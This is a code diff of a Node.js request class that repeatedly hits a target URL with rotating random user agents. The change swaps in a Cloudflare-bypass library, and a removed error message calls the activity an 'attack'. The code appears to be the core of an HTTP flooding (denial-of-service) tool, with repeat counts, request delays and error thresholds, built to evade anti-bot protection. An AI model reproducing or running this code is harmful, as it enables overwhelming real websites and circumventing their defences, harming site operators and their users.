@@ -2,7 +2,8 @@ const Constants = require("../constants/CustomHeader")
 const CustomError = require("../types/Error")
 const EventEmitter = require('events');
 const randomUseragent = require('random-useragent');
-const fetch = require("node-fetch")
+const CloudflareBypasser = require('cloudflare-bypasser');
+let cf = new CloudflareBypasser();
 const url_patern = /^https?:\/\/(?:www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)$/gm;
 
 class WebRequest extends EventEmitter {
@@ -12,11 +13,16 @@ class WebRequest extends EventEmitter {
         this._validateOptions(options)
         this.method = client.options.httpMethod;
         this.executed = 0;
-        this.errored = false;
+        this.errored = 0;
+        this._client = client;
+        this.interval = null;
         this._uid = this.random(10)
         this.status = Constants.REQUEST_CREATING
         this.on("debug", msg => client.emit("requestDebug", msg, this))
-        this.on("close", (id, msg) => client.emit("WebRequestClosed", (id, msg), this))
+        this.on("close", closeData => {
+            clearInterval(this.interval)
+            client.emit("WebRequestClosed", closeData)
+        })
         this.emit("debug", "[Http Request] The http request is being created with Id " + this._uid + "")
     }
 
@@ -54,32 +60,47 @@ class WebRequest extends EventEmitter {
         this.emit("debug", "[Web request] Starting the request")
         const options = this.options
         const method = this.method
-        for (this; this.executed < options.repeat; this.executed++) {
+        this.interval = setInterval(async() => {
+            if (this.status !== Constants.REQUEST_READY) return this.emit("close", {
+                id: this._uid,
+                reason: `The request request is not ready yet`,
+                code: 500
+            })
             if (this.executed == options.repeat) {
                 this.status = Constants.REQUEST_SENT;
-                this.emit("requestClosed", this._uid, `Request is finished.`)
+                this.emit("close", {
+                    id: this._uid,
+                    reason: `The request is finished. Executed ${this.executed} times for ${this.errored} errored requests`,
+                    code: 200
+                })
                 return;
             }
             if (this.errored > options.abortNumber) {
                 this.status = Constants.REQUEST_ERRORED;
-                this.emit("requestClosed", this._uid, `Reached "abortNumber" limit.`)
-                return new CustomError("More than 10 failed requests. Stopping the attack.")
+                this.emit("close", {
+                    id: this._uid,
+                    reason: `Reached "abortNumber" limit.`,
+                    code: 500
+                })
+                return;
             }
-            setTimeout(async() => {
-                try {
-                    this.emit("debug", "[Web request] Attempting to " + method + " the following Url:  " + options.targetUrl + "")
-                    fetch(options.targetUrl, {
-                        method: method,
-                        headers: { "User-Agent": randomUseragent.getRandom() },
-                    }).then(req => {
-                        this.emit("debug", `Got ${req.status} for the request with Id ${this._uid}`)
-                    })
-                } catch (error) {
-                    this.errored++;
-                    return new CustomError(error)
-                }
-            }, options.requestDelay);
-        }
+            try {
+                this.executed++;
+                this.emit("debug", "[Web request] Attempting to " + method + " the following Url:  " + options.targetUrl + "")
+                cf.request({
+                    url: options.targetUrl,
+                    method: method,
+                    headers: this._client.options.header ? this._client.options.header : { "User-Agent": randomUseragent.getRandom() },
+                }).then(req => {
+                    if (req.statusCode > 300) this.errored++;
+                    this.emit("debug", `Got ${req.statusCode} for the request with Id ${this._uid}`)
+                })
+            } catch (error) {
+                console.log(error)
+                this.errored++;
+            }
+        }, options.requestDelay);
+
     }
 
     async _validateOptions(options) {
